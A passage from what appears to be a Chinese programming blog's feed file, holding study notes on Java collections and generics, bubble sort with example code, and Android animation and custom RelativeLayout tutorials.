class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>由于年代久远基本上用不到这个集合</code></p><h2 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h2><p>创建链表集合<code>LinkedList li = new LinkedList&lt;&gt;();</code></p><p>常用方法与List一致</p><hr><h1 id="泛型"><a href="#泛型" class="headerlink" title="泛型"></a>泛型</h1><h2 id="泛型类"><a href="#泛型类" class="headerlink" title="泛型类"></a>泛型类</h2><p>概念：参数化类型、类型安全的集合，强制集合元素的类型必须一致</p><p>特点：</p><ul><li><p>编译时即可检查，而非运行时抛出异常</p></li><li><p>访问时，不必类型转换（拆箱）</p></li><li><p>不同泛型之间应用不能相互赋值，泛型不存在多态</p></li><li><p>本质是参数化类型，把类型作为参数传递</p></li><li><p>常见形式有泛型类、泛型接口、泛型方法</p></li><li><p>语法 T成为类型占位符，表示一种引用类型，可以写多个逗号隔开</p></li><li><p>好处 1. 提高代码重用性 2. 防止类型转换异常，提高代码安全性</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 写一个泛型类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyGeneric</span>&lt;<span class="title">T</span>&gt;</span>&#123;</span><br><span class="line">  <span class="comment">//使用泛型T</span></span><br><span class="line">  <span class="comment">//1 创建变量</span></span><br><span class="line">  T t;</span><br><span class="line">  <span class="comment">//2 泛型作为方法的参数</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">show</span><span class="params">(T t)</span></span>&#123;</span><br><span class="line">    sout(t);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//3 泛型作为方法的返回值</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> T <span class="title">getT</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用泛型类</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestGeneric</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    <span class="comment">//使用泛型类创建对象</span></span><br><span class="line">    <span class="comment">// 注意： 1. 泛型只能使用引用类型</span></span><br><span class="line">    <span class="comment">// 2. 不用泛型类型对象之间不能相互赋值</span></span><br><span class="line">    MyGeneric&lt;String&gt; myGeneric = <span class="keyword">new</span> MyGeneric&lt;String&gt;();</span><br><span class="line">    myGeneric.t = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">    myGeneric.show(<span class="string">&quot;hello world!&quot;</span>);</span><br><span class="line">    String string = myGeneric.getT();</span><br><span class="line">    </span><br><span class="line">    MyGeneric&lt;Integer&gt; myGeneric2 = <span class="keyword">new</span> MyGeneric&lt;Integer&gt;();</span><br><span class="line">    myGeneric2.t = <span class="number">100</span>;</span><br><span class="line">    myGeneric2.show(<span class="number">200</span>);</span><br><span class="line">    Integer integer = myGeneric2.getT();</span><br><span class="line">    </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="泛型接口"><a href="#泛型接口" class="headerlink" title="泛型接口"></a>泛型接口</h2><p>注意：不能泛型静态常量</p><h2 id="泛型方法"><a href="#泛型方法" class="headerlink" title="泛型方法"></a>泛型方法</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyGenericMethod</span></span>&#123;</span><br><span class="line">  <span class="comment">//泛型方法</span></span><br><span class="line">  <span class="keyword">public</span> &lt;T&gt; <span class="function">T <span class="title">show</span><span class="params">(T t)</span></span>&#123;</span><br><span class="line">    sout(<span class="string">&quot;泛型方法&quot;</span> + t);</span><br><span class="line">    <span class="keyword">return</span> t;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//调用</span></span><br><span class="line">MyGenericMethod myGenericMethod = <span class="keyword">new</span> MyGenericMethod();</span><br><span class="line">myGenericMethod.show(<span class="string">&quot;字符串&quot;</span>);<span class="comment">// 自动类型为字符串</span></span><br><span class="line">myGenericMethod.show(<span class="number">200</span>);<span class="comment">// integer类型</span></span><br><span class="line">myGenericMethod.show(<span class="number">3.14</span>);<span class="comment">// double类型</span></span><br></pre></td></tr></table></figure><h1 id="Set集合"><a href="#Set集合" class="headerlink" title="Set集合"></a>Set集合</h1><p>特点：无序、无下标、元素不可重复</p><p>方法：全部继承自Collection中的方法</p><p>增、删、遍历、判断与collection一致</p><h2 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h2><p>存储结构：哈希表（数组+链表+红黑树）</p><p>存储过程（重复依据）</p><ol><li>根据hashCode计算保存的位置，如果位置为空，直接保存，若不为空，进行第二步</li><li>再执行equals方法，如果equals为true，则认为是重复，否则形成链表</li></ol><p>特点</p><ul><li>基于HashCode计算元素存放位置<ul><li>利用31这个质数，减少散列冲突<ul><li>31提高执行效率 <code>31 * i = (i &lt;&lt; 5) - i</code> 转为移位操作</li></ul></li><li>当存入元素的哈希码相同时，会调用equals进行确认，如果结果为true，则拒绝后者存入</li></ul></li></ul><p>新建集合 <code>HashSet&lt;String&gt; hashSet = new HashSet&lt;String&gt;();</code></p><p>添加元素 <code>hashSet.add( );</code></p><p>删除元素 <code>hashSet.remove( );</code></p><p>遍历操作</p><ol><li><p>增强for <code>for( type type : hashSet)</code></p></li><li><p>迭代器 <code>Iterator&lt;String&gt; it = hashSet.iterator( );</code></p></li></ol><p>判断 <code>hashSet.contains( );</code> <code>hashSet.isEmpty();</code></p><h2 id="TreeSet"><a href="#TreeSet" class="headerlink" title="TreeSet"></a>TreeSet</h2><p>特点</p><ul><li>基于排列顺序实现元素不重复</li><li>实现SortedSet接口，对集合元素自动排序</li><li>元素对象的类型必须实现Comparable接口，指定排序规则</li><li>通过CompareTo方法确定是否为重复元素</li></ul><p>存储结构：红黑树</p><p>创建集合 <code>TreeSet&lt;String&gt; treeSet = new TreeSet&lt;&gt;()</code></p><p>添加元素 <code>treeSet.add();</code></p><p>删除元素 <code>treeSet.remove();</code></p><p>遍历 1. 增强for 2. 迭代器</p><p>判断 <code>treeSet.contains();</code></p><p>补充：TreeSet集合的使用</p><p>Comparator 实现定制比较（比较器）</p><p>Comparable 可比较的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 重写compare</span></span><br><span class="line"><span class="meta">@override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Person o1, Person o2)</span></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n1 = o1.getAge()-o2.getAge();</span><br><span class="line">  <span class="keyword">int</span> n2 = o1.getName().comareTo(o2.getName());</span><br><span class="line">  <span class="keyword">return</span> n1 == <span class="number">0</span> ? n2 : n1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Map"><a href="#Map" class="headerlink" title="Map"></a>Map</h2><p>Map接口的特点</p><ol><li>用于存储任意键值对（key - value） </li><li> 键：无序、无下标、不允许重复（唯一） </li><li> 值：无序、无下标、允许重复</li></ol><p>方法：</p><ol><li>V put(K key, V value) 将对象存到集合中，关联键值 </li><li>Object get(Object key) 根据键获得对应的值 </li><li> Set<K> 返回所有的Key </li><li> Collection<V> values() 返回包含所有值的Collection集合 </li><li> Set&lt;Map.Entry&lt;K, V&gt;&gt; 键值匹配的Set集合</li></ol><h2 id="Map接口的使用"><a href="#Map接口的使用" class="headerlink" title="Map接口的使用"></a>Map接口的使用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建Map集合</span></span><br><span class="line">Map&lt;String, String&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"><span class="comment">// 1. 添加元素</span></span><br><span class="line">map.put(<span class="string">&quot;cn&quot;</span>, <span class="string">&quot;中国&quot;</span>);</span><br><span class="line">map.put(<span class="string">&quot;uk&quot;</span>, <span class="string">&quot;英国&quot;</span>);</span><br><span class="line">map.put(<span class="string">&quot;cn&quot;</span>, <span class="string">&quot;zhongguo&quot;</span>); <span class="comment">// 会替换第一个 </span></span><br><span class="line"><span class="comment">// 2. 删除</span></span><br><span class="line">map.remove(<span class="string">&quot;uk&quot;</span>);</span><br><span class="line"><span class="comment">// 3. 遍历</span></span><br><span class="line"><span class="comment">// 3.1 使用KeySet()</span></span><br><span class="line"><span class="comment">//Set&lt;String&gt; keyset = map.keySet(); // 所有Key的set集合</span></span><br><span class="line"><span class="keyword">for</span>(String key : map.keyset)&#123;</span><br><span class="line">  sout(key + <span class="string">&quot;---&quot;</span> + map.get(key));</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 3.2 使用entrySet()</span></span><br><span class="line"><span class="comment">//Set&lt;Map.Entry&lt;String, String&gt;&gt; entries = map.entrySet();</span></span><br><span class="line"><span class="keyword">for</span>(Map.Entry&lt;String, String&gt; entry : map.entries)&#123;</span><br><span class="line">  sout(entry.getKey() + <span class="string">&quot;---&quot;</span> + entry.getValue();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h2><p>存储结构：哈希表（数组+链表+红黑树）</p><p>使用key可使hashcode和equals作为重复</p><p>增、删、遍历、判断与上述一致</p><p>原码分析总结：</p><ol><li>HashMap刚创建时，table是null，节省空间，当添加第一个元素时，table容量调整为16</li><li>当元素个数大于阈值（16*0.75 = 12）时，会进行扩容，扩容后的大小为原来的两倍，目的是减少调整元素的个数</li><li>jdk1.8 当每个链表长度 &gt;8 ，并且数组元素个数 ≥64时，会调整成红黑树，目的是提高效率</li><li>jdk1.8 当链表长度 &lt;6 时 调整成链表</li><li>jdk1.8 以前，链表时头插入，之后为尾插入</li></ol><h2 id="Hashtable"><a href="#Hashtable" class="headerlink" title="Hashtable"></a>Hashtable</h2><p>线程安全，运行效率慢；不允许null作为key或是value</p><h2 id="Properties"><a href="#Properties" class="headerlink" title="Properties"></a>Properties</h2><p>hashtable的子类，要求key和value都是string，通常用于配置文件的读取</p><h2 id="TreeMap"><a href="#TreeMap" class="headerlink" title="TreeMap"></a>TreeMap</h2><p>实现了SortedMap接口（是map的子接口），可以对key自动排序</p><h1 id="Collection工具类"><a href="#Collection工具类" class="headerlink" title="Collection工具类"></a>Collection工具类</h1><p>概念：集合工具类，定义了除了存取以外的集合常用方法</p><p>直接二分查找<code>int i = Collections.binarySearch(list, x);</code> 成功返回索引</p><p>其他方法 ： <strong>copy复制、reverse反转、shuffle打乱</strong></p><p>代码演示:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// list转成数组</span></span><br><span class="line">Integer[] arr = list.toArray(<span class="keyword">new</span> Integer[<span class="number">10</span>]);</span><br><span class="line">sout(arr.length);</span><br><span class="line">sout(Array.toString(arr));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 数组转成集合</span></span><br><span class="line"><span class="comment">// 此时为受限集合，不能 添加和删除！</span></span><br><span class="line">String[] name = &#123;<span class="string">&quot;张三&quot;</span>,<span class="string">&quot;李四&quot;</span>,<span class="string">&quot;王五&quot;</span>&#125;;</span><br><span class="line">List&lt;String&gt; list2 = Arrays.asList(names);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 把基本类型数组转为集合时，需要修改为包装类</span></span><br><span class="line">Integer[] nums = &#123;<span class="number">100</span>, <span class="number">200</span>, <span class="number">300</span>, <span class="number">400</span>, <span class="number">500</span>&#125;;</span><br><span class="line">List&lt;Integer&gt; list3 = Arrays.asList(nums);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> JavaSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaSE </tag>
            
            <tag> JAVA集合框架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>排序算法解析</title>
      <link href="/2022/01/19/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E8%A7%A3%E6%9E%90/"/>
      <url>/2022/01/19/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E8%A7%A3%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<center><h1>    排序算法    </h1></center><h1 id="排序算法"><a href="#排序算法" class="headerlink" title="排序算法"></a>排序算法</h1><p>排序算法是《数据结构与算法》中最基本的算法之一。</p><p>排序算法可以分为内部排序和外部排序，内部排序是数据记录在内存中进行排序，而外部排序是因排序的数据很大，一次不能容纳全部的排序记录，在排序过程中需要访问外存。常见的内部排序算法有：插入排序、希尔排序、选择排序、冒泡排序、归并排序、快速排序、堆排序、基数排序等。用一张图概括：</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201191325070.png"></p><h1 id="1、冒泡排序"><a href="#1、冒泡排序" class="headerlink" title="1、冒泡排序"></a>1、冒泡排序</h1><h2 id="1-1叙述"><a href="#1-1叙述" class="headerlink" title="1.1叙述"></a>1.1叙述</h2><p><strong>冒泡排序（Bubble Sort）</strong>也是一种简单直观的排序算法。它重复地走访过要排序的数列，一次比较两个元素，如果他们的顺序错误就把他们交换过来。走访数列的工作是重复地进行直到没有再需要交换，也就是说该数列已经排序完成。</p><h2 id="1-2算法演示"><a href="#1-2算法演示" class="headerlink" title="1.2算法演示"></a>1.2算法演示</h2><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201191328801.gif"></p><p><strong>最快的时候</strong>：输入数据已经是 <code>正序</code> , 这时候只需要循环确定一遍，时间复杂度为 <code>O(n)</code></p><p><strong>最慢的时候</strong>：输入数据是 <code>反序</code> ，这时候需要嵌套式循环移动，时间复杂度为 <code>O(n^2)</code></p><h2 id="1-3代码实现"><a href="#1-3代码实现" class="headerlink" title="1.3代码实现"></a>1.3代码实现</h2><p>1.升序排序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 冒泡排序法</span></span><br><span class="line"><span class="comment"> *  比较数组中，两个相邻的元素，如果第一个数比第二个数大，我们就交换他们的位置</span></span><br><span class="line"><span class="comment"> *  每一次比较都会产生一个最大的数或者最小的数</span></span><br><span class="line"><span class="comment"> *  下一轮则可以少一次排序</span></span><br><span class="line"><span class="comment"> *  依次循环直到结束</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] xort(<span class="keyword">int</span>[] array)&#123;</span><br><span class="line"><span class="comment">//        临时变量</span></span><br><span class="line">        <span class="keyword">int</span> temp;</span><br><span class="line"><span class="comment">//        外层循环，判断要走多少次</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line"><span class="comment">//            内层循环 比较两个数，如果第一个数比第二个数大则交换位置</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; array.length - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(array[j+<span class="number">1</span>] &lt; array[j])&#123;  <span class="comment">// 比较符号决定排序的顺序</span></span><br><span class="line">                    temp = array[j];</span><br><span class="line">                    array[j] = array[j+<span class="number">1</span>];</span><br><span class="line">                    array[j+<span class="number">1</span>] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>2、降序排序法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 冒泡排序法</span></span><br><span class="line"><span class="comment"> *  比较数组中，两个相邻的元素，如果第一个数比第二个数大，我们就交换他们的位置</span></span><br><span class="line"><span class="comment"> *  每一次比较都会产生一个最大的数或者最小的数</span></span><br><span class="line"><span class="comment"> *  下一轮则可以少一次排序</span></span><br><span class="line"><span class="comment"> *  依次循环直到结束</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span>[] xort(<span class="keyword">int</span>[] array)&#123;</span><br><span class="line"><span class="comment">//        临时变量</span></span><br><span class="line">        <span class="keyword">int</span> temp;</span><br><span class="line"><span class="comment">//        外层循环，判断要走多少次</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; array.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line"><span class="comment">//            内层循环 比较两个数，如果第一个数比第二个数大则交换位置</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; array.length - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(array[j+<span class="number">1</span>] &gt; array[j])&#123;  <span class="comment">// 比较符号决定排序的顺序</span></span><br><span class="line">                    temp = array[j];</span><br><span class="line">                    array[j] = array[j+<span class="number">1</span>];</span><br><span class="line">                    array[j+<span class="number">1</span>] = temp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> array;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>3、代码测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span>[] array = &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">42</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">23</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span>[] array2 = &#123;<span class="number">1</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">42</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">23</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span>[] xort = xort(array);</span><br><span class="line">    <span class="keyword">int</span>[] xort2 = xort2(array2);</span><br><span class="line">    System.out.println(<span class="string">&quot;升序:&quot;</span>+Arrays.toString(xort));</span><br><span class="line">    System.out.println(<span class="string">&quot;降序:&quot;</span>+Arrays.toString(xort2));</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>4、测试结果</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201191404062.png"></p><h1 id="2、选择排序"><a href="#2、选择排序" class="headerlink" title="2、选择排序"></a>2、选择排序</h1><h2 id="2-1叙述"><a href="#2-1叙述" class="headerlink" title="2.1叙述"></a>2.1叙述</h2><p>选择排序是一种简单直观的排序算法，无论什么数据进去都是 O(n²) 的时间复杂度。所以用到它的时候，数据规模越小越好。唯一的好处就是不占用额外的内存空间。</p><h2 id="2-2-排序原理"><a href="#2-2-排序原理" class="headerlink" title="2.2 排序原理"></a>2.2 排序原理</h2><p>首先在未排序序列中找到最小（大）元素，存放到排序序列的起始位置。</p><p>再从剩余未排序元素中继续寻找最小（大）元素，然后放到已排序序列的末尾。</p><p>重复第二步，直到所有元素均排序完毕。</p><h2 id="2-3算法演示"><a href="#2-3算法演示" class="headerlink" title="2.3算法演示"></a>2.3算法演示</h2><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202201191406550.gif"></p><p>无论什么数据进去都是 <code>O(n²)</code> 的时间复杂度</p><h2 id="2-4-代码实现"><a href="#2-4-代码实现" class="headerlink" title="2.4 代码实现"></a>2.4 代码实现</h2><h1 id="3、插入排序"><a href="#3、插入排序" class="headerlink" title="3、插入排序"></a>3、插入排序</h1><h1 id="4、希尔排序"><a href="#4、希尔排序" class="headerlink" title="4、希尔排序"></a>4、希尔排序</h1><h1 id="5、归并排序"><a href="#5、归并排序" class="headerlink" title="5、归并排序"></a>5、归并排序</h1><h1 id="6、快速排序"><a href="#6、快速排序" class="headerlink" title="6、快速排序"></a>6、快速排序</h1><h1 id="7、堆排序"><a href="#7、堆排序" class="headerlink" title="7、堆排序"></a>7、堆排序</h1>]]></content>
      
      
      <categories>
          
          <category> 算法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 排序算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓内置动画属性</title>
      <link href="/2021/12/20/%E5%8A%A8%E7%94%BB%E5%B1%9E%E6%80%A7API/"/>
      <url>/2021/12/20/%E5%8A%A8%E7%94%BB%E5%B1%9E%E6%80%A7API/</url>
      
        <content type="html"><![CDATA[<center><h1>    动画属性API    </h1></center><h1 id="属性动画"><a href="#属性动画" class="headerlink" title="属性动画"></a>属性动画</h1><ul><li>属性动画ViewPropertyAnimator类</li></ul><ol><li><p>调用方法</p><ol><li><p>控件名.animate().动作;</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201546823.png"></p></li></ol><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201547741.jpg"></p></li><li><p>动画时常默认是500ms</p><ul><li>改变动画时长</li><li><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201550589.jpg"></li></ul></li><li><p>速度模型</p><ul><li><p>InterPolator    内插(速度设置器)</p><p>1、设置动画匀速运动</p><ul><li><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201552851.jpg"></li></ul><p>2、设置前摇和回弹的InterPolator</p><ul><li><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201553022.jpg"></li></ul></li></ul></li><li><p>设置监听器</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201553983.jpg"></p></li></ol><h1 id="Dome请看gitee主页"><a href="#Dome请看gitee主页" class="headerlink" title="Dome请看gitee主页"></a>Dome请看gitee主页</h1><p><a href="https://gitee.com/airgwl/gznxsmart-home">gwl/SmartHomeV5 (gitee.com)</a></p><h1 id="详细请看"><a href="#详细请看" class="headerlink" title="详细请看"></a>详细请看</h1><p><a href="https://rengwuxian.com/ui-1-6/">动画属性API</a></p>]]></content>
      
      
      <categories>
          
          <category> Android开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓RelativeLayout组合图片</title>
      <link href="/2021/12/20/RelativeLayout%E7%BB%84%E5%90%88%E5%9B%BE%E7%89%87/"/>
      <url>/2021/12/20/RelativeLayout%E7%BB%84%E5%90%88%E5%9B%BE%E7%89%87/</url>
      
        <content type="html"><![CDATA[<center><h1>    RelativeLayout组合图片    </h1></center><h1 id="资源准备"><a href="#资源准备" class="headerlink" title="资源准备"></a>资源准备</h1><ul><li>创建一个xml布局文件，将所需的图片组合成一个图像</li></ul><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201501589.jpg"></p><h1 id="自定义RelativeLayout"><a href="#自定义RelativeLayout" class="headerlink" title="自定义RelativeLayout"></a>自定义RelativeLayout</h1><ol><li><p>创建一个类让他继承于RelativeLayout并且实现它的三个构造方法</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201504885.jpg"></p></li><li><p>自定义一个方法并实现布局文件加载(要有上下文参数)</p><p><code>注意:</code> 要在上面上个构造方法中分别调用你这个自定义的方法</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201506551.png"></p></li><li><p>在主布局文件中使用该定义的控件对象</p><p><code>在这使用的是Android Studio3.0版本</code></p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201510021.jpg"></p></li></ol><h1 id="动画效果"><a href="#动画效果" class="headerlink" title="动画效果"></a>动画效果</h1><ul><li>为自定义VIew添加图片旋转动画效果</li></ul><ol><li><p>在自定义的类文件中创建一个方法，并接收一个动画数据</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201520696.jpg"></p></li><li><p>将接收的数据转成自己想要的数据类型</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201520288.jpg"></p></li><li><p>创建动画类对象(Object Animator)</p><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201520041.jpg"></p></li><li><p>在调用自定义控件的类文件中调用方法</p><p> <img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201520295.jpg"></p></li></ol><h1 id="效果展示"><a href="#效果展示" class="headerlink" title="效果展示"></a>效果展示</h1><p><img src="https://raw.githubusercontent.com/gwlnigth/upic/main/img/202112201521791.jpg"></p><h1 id="Dome请看gitee主页"><a href="#Dome请看gitee主页" class="headerlink" title="Dome请看gitee主页"></a>Dome请看gitee主页</h1><p><a href="https://gitee.com/airgwl/gznxsmart-home">gwl/SmartHomeV5 (gitee.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> Android开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓渐变色进度条</title>
      <link href="/2021/12/20/%E6%B8%90%E5%8F%98%E8%89%B2%E8%BF%9B%E5%BA%A6%E6%9D%A1/"/>
      <url>/2021/12/20/%E6%B8%90%E5%8F%98%E8%89%B2%E8%BF%9B%E5%BA%A6%E6%9D%A1/</url>
      
